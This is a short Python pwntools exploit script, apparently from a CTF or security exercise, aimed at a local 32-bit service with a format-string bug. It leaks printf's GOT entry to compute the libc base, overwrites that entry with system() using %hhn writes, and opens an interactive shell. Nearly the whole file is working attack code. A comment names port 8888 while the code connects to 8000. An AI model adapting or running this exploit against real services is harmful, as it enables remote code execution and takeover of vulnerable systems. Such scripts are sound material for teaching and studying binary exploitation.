#!/usr/bin/env python

from pwn import *

# Start your service by 'ncat -vc ./vul -kl 127.0.0.1 8888'
r = remote('127.0.0.1', 8000)
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

printf_got = 0x804a00c

# Find these offsets by 'readelf -s /lib/i386-linux-gnu/libc.so.6'
system_off = libc.symbols['system']
printf_off = libc.symbols['printf']

def fmt(s):
  r.send(s + '\n')
  return r.recvrepeat(0.1)

# Calculate libc base address by leaking printf@got
base = u32(fmt(p32(printf_got) + '%5$s')[4:8]) - printf_off
print base
system = base + system_off
print 'Libc base:', hex(base)

# Now, we want to hijack 'printf' to 'system', to system('sh')
# Prepare %hhn format string
p = ''.join(p32(printf_got+i) for i in range(4))
printed = 16
for i in range(4):
  byte = (system >> (i*8)) & 0xff # value of byte[i]
  pad = ((byte - printed) % 256 + 256) % 256
  if pad > 0:
    p += '%%%dc' % (pad)
  p += '%%%d$hhn' % (5+i)
  printed += pad
print "%r" % p

# Overwrite printf() to system()
fmt(p) 

r.interactive()
